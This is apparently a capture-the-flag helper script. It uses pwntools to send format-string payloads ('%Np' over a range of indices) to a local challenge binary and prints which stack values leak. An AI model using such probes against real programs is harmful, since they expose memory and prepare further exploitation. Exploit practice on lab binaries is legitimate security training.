from pwn import *
#automatically get context arch
elf=context.binary=ELF('pwn/sakana/sakana',checksec=False)

for i in range(100):
    try:
        #level used to reduce noise
        p=process(level='error')
        p.sendlineafter(b'>','printf')
        p.sendline(b'aaa %{}p'.format(i).encode())
        sleep(0.01)
        p.recvuntil('>')
        result= p.recvlines(2)[0].split(' ')[-1:]
        if result :
            print(str(i)+': '+str(result).strip())
    except:
        pass